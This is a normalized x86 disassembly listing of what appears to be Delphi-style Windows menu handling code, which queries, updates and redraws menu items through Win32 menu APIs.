mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_446e4c
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_446e4c
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_44808c
test al al
je r-xdata
mov eax esi
call sub_446e4c
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_446e5c
call sub_447ee4
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_446e5c
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_446e5c
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_446e5c
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_446e5c
call sub_447ee4
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_446e5c
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_446e5c
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_446e5c
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_446e5c
call sub_447ee4
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_448060
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_448060
and eax 0x7f
mov al [ eax + rw-data ]
sub_44808c
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_44808c
and eax 0x7f
mov al [ eax + rw-data ]
sub_4480b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_444da0
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_419270
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_448de4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_448154
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_403128
mov eax [ esi + 0x44 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4192bc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_4481c8
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_4481c8
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_44490c
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_447250
mov eax ebx
pop esi
pop ebx
retn
sub_448208
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_446e4c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_446e5c
call sub_448208
pop ecx
test al al
je r-xdata
sub_4482a0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_448208
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_44490c
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4482d0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_4482a0
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_4495f4
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_448340
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_4482a0
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_44835c
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_4482a0
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_447a0c
mov ebx eax
xor edx edx
mov eax edi
call sub_447f08
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_447374
mov eax [ esi + 0x34 ]
call sub_447374
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_4452b0
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_43b390
push eax
call DrawMenuBar
sub_448448
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_448448
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_44856d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_4482a0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_447374
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_448438
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_44859c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_4235b4
xor eax eax
push ebp
push sub_44869a
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4235b4
xor eax eax
push ebp
push sub_44866f
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_448448
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4235ac
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4486a1
mov eax [ rw-data ]
call sub_4235ac
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_4482a0
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_4486c0
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_448a44
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_448a44
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_44877c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_448d18
mov eax ebx
call sub_4083d4
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_44881c
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_44877c
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_4040e8
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_404338
lea edx [ ebp - 0x200 ]
call sub_408498
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_4488b0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_448920
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_448dc0
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_448dc0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_448dc0
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_44892c
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_44881c
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_4488b0
mov eax ebx
call sub_448de4
jmp r-xdata
sub_448994
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_4489dc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_442c0c
mov eax ebx
call sub_4481f0
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_442c50
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_419340
sub_448a18
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41958c
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_4489dc
sub_448a5c
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_4482a0
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_4482a0
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_44c68c
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_448ab8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_448b8d
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_4482a0
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_4482a0
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_446e4c
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_446e5c
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_404060
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_404060
mov eax [ ebp - 0xc ]
pop edx
call sub_407c1c
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_449904
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448b94
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403e9c
retn
sub_448ba0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_448a5c
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_448ab8
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_448d18
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_448424
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_4482a0
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_4482a0
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_408478
mov eax [ ebp + 0x10 ]
call sub_4083bc
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_448de4
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_431a40
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_448dc0
mov [ ebx + 0x41 ] 0x1
sub_448e0c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032d8
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_448dc0
mov [ ebx + 0x41 ] 0x1
sub_448e98
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_448994
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_44881c
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_448f28
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_448f64
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_448f8e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_448fb0
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4494e3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4494ea
lea eax [ ebp - 0x30 ]
call sub_403e78
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4138b8
mov edx [ esi + 0x4 ]
call sub_44835c
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_455d94
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4138b8
mov dx [ esi + 0x4 ]
call sub_448340
test al al
jne r-xdata
jmp r-xdata
